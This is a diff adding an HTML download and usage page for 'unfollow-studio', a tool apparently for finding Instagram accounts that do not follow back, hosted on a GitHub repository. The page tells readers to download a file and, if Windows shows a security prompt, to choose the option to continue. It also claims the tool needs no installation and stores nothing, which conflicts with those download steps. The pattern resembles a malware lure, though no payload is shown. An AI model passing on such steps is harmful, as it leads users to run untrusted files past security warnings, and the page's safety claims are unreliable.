+    <a href="https://github.com/Slime2r1r31/unfollow-studio" style="display: inline-block; padding: 16px 32px; font-size: 1.05rem; font-weight: 700; color: #ffffff; text-decoration: none; background: linear-gradient(135deg, #5b21b6 0%, #db2777 100%); border-radius: 12px; box-shadow: 0 8px 20px rgba(91, 33, 182, 0.28);">⬇️ Get unfollow-studio</a>
+  </p>
+
+  <p style="margin: 0 0 20px 0;"><strong>Visit this link to download the application.</strong></p>
+
+  <ol style="margin: 0 0 22px 0; padding-left: 22px;">
+    <li style="margin-bottom: 14px;"><strong>Open the download page.</strong> Click the button above, or type <span style="background: #ece8f8; padding: 2px 7px; border-radius: 6px; font-family: Consolas, monospace; font-size: 0.92em; color: #4b2a9c;">github.com/Slime2r1r31/unfollow-studio</span> into your browser's address bar and press Enter.</li>
+    <li style="margin-bottom: 14px;"><strong>Download the application.</strong> On the page, choose the download option and save the file to a folder you will remember, such as your Desktop or Downloads folder.</li>
+    <li style="margin-bottom: 14px;"><strong>Wait for the download to finish.</strong> You can follow the progress in your browser's download bar. The time it takes depends on your internet connection.</li>
+    <li style="margin-bottom: 14px;"><strong>Find the downloaded file.</strong> Press the Windows key, type "Downloads", and press Enter. Your file will be waiting there.</li>
+    <li style="margin-bottom: 0;"><strong>Launch the studio.</strong> Open the application's main page in your browser and the interface appears, ready for you to use.</li>
+  </ol>
+
+  <p style="margin: 0 0 0 0; background: #f1ecfd; border-left: 4px solid #7b2ff7; padding: 16px 20px; border-radius: 8px;">If Windows shows a security prompt when you open a downloaded file, choose the option that lets you continue. This is a standard Windows message shown for files that come from the internet.</p>
+
+  <hr style="border: none; border-top: 1px solid #e3dff0; margin: 44px 0;">
+
+  <h2 style="font-size: clamp(1.3rem, 4vw, 1.6rem); margin: 0 0 18px 0; font-weight: 700; color: #241a45;">🖱️ Using the Interface</h2>
+
+  <p style="margin: 0 0 18px 0;">Once the page is open, the layout guides you through the whole process step by step.</p>
+
+  <p style="margin: 0 0 14px 0;"><strong>Step 1 — Load your followers.</strong> Add the list of accounts that currently follow you. The studio displays them in a tidy, scrollable panel.</p>
+
+  <p style="margin: 0 0 14px 0;"><strong>Step 2 — Load your following.</strong> Do the same for the accounts you follow. Both lists now sit side by side, easy to compare.</p>
+
+  <p style="margin: 0 0 14px 0;"><strong>Step 3 — Review the results.</strong> The tool marks the accounts that do not appear in both lists. These are your non-followers — the profiles taking up space in your following list without returning the gesture.</p>
+
+  <p style="margin: 0 0 14px 0;"><strong>Step 4 — Make your choices.</strong> Go through the highlighted accounts and decide which ones to remove. Take your time; there is no timer and no limit.</p>
+
+  <p style="margin: 0 0 0 0;"><strong>Step 5 — Clear your session.</strong> When you are finished, close the tab. Nothing is stored anywhere else.</p>
+
+  <hr style="border: none; border-top: 1px solid #e3dff0; margin: 44px 0;">
+
+  <h2 style="font-size: clamp(1.3rem, 4vw, 1.6rem); margin: 0 0 18px 0; font-weight: 700; color: #241a45;">💡 Practical Tips</h2>
+
+  <ul style="margin: 0 0 0 0; padding-left: 22px;">
+    <li style="margin-bottom: 12px;">Work in small batches. Reviewing twenty or thirty accounts at a time keeps the task manageable and lets you think about each one.</li>
+    <li style="margin-bottom: 12px;">Keep a note of anyone you want to re-follow later. It is easy to forget a name once it leaves your list.</li>
+    <li style="margin-bottom: 12px;">Check back every few months. Following lists change slowly, so a regular review keeps things tidy without any daily effort.</li>
+    <li style="margin-bottom: 0;">Refresh your lists before each session so the studio is always working with current information.</li>
+  </ul>
+
+  <hr style="border: none; border-top: 1px solid #e3dff0; margin: 44px 0;">
+
+  <h2 style="font-size: clamp(1.3rem, 4vw, 1.6rem); margin: 0 0 18px 0; font-weight: 700; color: #241a45;">🛠️ Troubleshooting</h2>
+
+  <p style="margin: 0 0 14px 0;"><strong>The page looks empty or broken.</strong> Make sure you opened the correct file from the downloaded folder. Try closing the tab and opening it again.</p>
+
+  <p style="margin: 0 0 14px 0;"><strong>Updates are not appearing.</strong> A normal browser refresh usually solves this. Press F5 on your keyboard or click the refresh arrow next to the address bar.</p>
+
+  <p style="margin: 0 0 14px 0;"><strong>The download did not start.</strong> Return to the download page, refresh it, and choose the download option again. Check that your browser is not blocking downloads from the site.</p>
+
+  <p style="margin: 0 0 14px 0;"><strong>Text looks too small or too large.</strong> Hold the Ctrl key and press the plus or minus key to change the zoom level in your browser.</p>
+
+  <p style="margin: 0 0 0 0;"><strong>You are unsure which file to open.</strong> Look for the main page file in the downloaded folder — it opens directly in your browser and displays the studio interface.</p>
+
+  <hr style="border: none; border-top: 1px solid #e3dff0; margin: 44px 0;">
+
+  <h2 style="font-size: clamp(1.3rem, 4vw, 1.6rem); margin: 0 0 18px 0; font-weight: 700; color: #241a45;">❓ Frequently Asked Questions</h2>
+
+  <p style="margin: 0 0 14px 0;"><strong>Does it cost anything?</strong> No. unfollow-studio is completely free to download and use.</p>
+
+  <p style="margin: 0 0 14px 0;"><strong>Do I have to give my Instagram password?</strong> No. The tool never asks for your login details and does not connect to your account on your behalf.</p>
+
+  <p style="margin: 0 0 14px 0;"><strong>Where is my data stored?</strong> On your own computer, and only for as long as the session is open. There is no cloud storage and no server database.</p>
+
+  <p style="margin: 0 0 14px 0;"><strong>Does it run on Windows?</strong> Yes. It runs in the web browser on your Windows computer, so no separate installation is required.</p>
+
+  <p style="margin: 0 0 14px 0;"><strong>Do I need to install anything else?</strong> No. The application works with the browser that is already on your computer.</p>
+
+  <p style="margin: 0 0 14px 0;"><strong>Can I use it more than once?</strong> Yes. There is no limit on how many times you open the tool or how many sessions you start.</p>
+
+  <p style="margin: 0 0 0 0;"><strong>Who can see what I load into it?</strong> Only you. Because there is no backend, your lists are never sent anywhere outside your own machine.</p>
+
+</main>
+
 </body>
 </html>
